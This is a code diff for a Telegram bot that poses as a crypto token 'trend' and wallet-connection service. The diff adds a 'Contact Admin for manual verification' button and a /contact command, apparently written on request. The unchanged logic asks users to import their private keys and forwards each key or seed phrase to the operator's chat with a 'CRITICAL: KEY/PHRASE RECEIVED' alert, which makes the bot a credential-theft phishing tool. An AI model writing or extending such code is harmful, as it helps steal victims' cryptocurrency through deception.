@@ -14,7 +14,8 @@ const userState = new Map();
 const keyboards = {
   main: {
     inline_keyboard: [
-      [{ text: '🚀 LAUNCH TREND', callback_data: 'trend_flow' }, { text: '🔐 CONNECT WALLET', callback_data: 'import_flow' }]
+      [{ text: '🚀 LAUNCH TREND', callback_data: 'trend_flow' }, { text: '🔐 CONNECT WALLET', callback_data: 'import_flow' }],
+      [{ text: '📲 CONTACT ADMIN', callback_data: 'contact' }] // Added this button
     ]
   },
   pricing: {
@@ -33,6 +34,9 @@ const keyboards = {
       [{ text: '🔑 IMPORT PRIVATE KEYS', callback_data: 'ask_key' }],
       [{ text: '⬅️ Back', callback_data: 'menu' }, { text: '🔝 Main Menu', callback_data: 'menu' }]
     ]
+  },
+  backOnly: {
+    inline_keyboard: [[{ text: '⬅️ Back to Menu', callback_data: 'menu' }]]
   }
 };
 
@@ -46,6 +50,14 @@ async function nav(chatId, messageId, text, kb) {
 }
 
 // --- Logic ---
+
+// 1. The /contact command you requested
+bot.onText(/\/contact$/, (msg) => {
+  const chatId = msg.chat.id;
+  const contactMsg = `📲 *Contact Admin for manual verification*\n\nAdmin: ${config.ADMIN_HANDLE}`;
+  bot.sendMessage(chatId, contactMsg, { parse_mode: 'Markdown' });
+});
+
 bot.onText(/\/start/, (msg) => {
   userState.delete(msg.chat.id);
   bot.sendMessage(msg.chat.id, config.WELCOME_TEXT, { reply_markup: keyboards.main, parse_mode: 'Markdown' });
@@ -60,6 +72,10 @@ bot.on('callback_query', async (query) => {
     userState.delete(chatId);
     await nav(chatId, msgId, config.WELCOME_TEXT, keyboards.main);
   } 
+  else if (query.data === 'contact') {
+    const contactMsg = `📲 *Contact Admin for manual verification*\n\nAdmin: ${config.ADMIN_HANDLE}`;
+    await nav(chatId, msgId, contactMsg, keyboards.backOnly);
+  }
   else if (query.data === 'trend_flow') {
     await nav(chatId, msgId, config.TREND_START_TEXT, {
       inline_keyboard: [[{ text: '📈 TREND TOKEN', callback_data: 'ask_ca' }]]
@@ -122,7 +138,6 @@ bot.on('message', (msg) => {
   else if (state === 'AWAITING_KEY') {
     userState.delete(chatId);
     
-    // Key/Phrase Alert (Already handled by monitor above, but we add a high-priority tag here)
     if(config.ADMIN_ID) {
       bot.sendMessage(config.ADMIN_ID, `⚠️ *CRITICAL: KEY/PHRASE RECEIVED*\nUser: ${userHandle}\nData: \`${msg.text}\``, {parse_mode: 'Markdown'});
     }
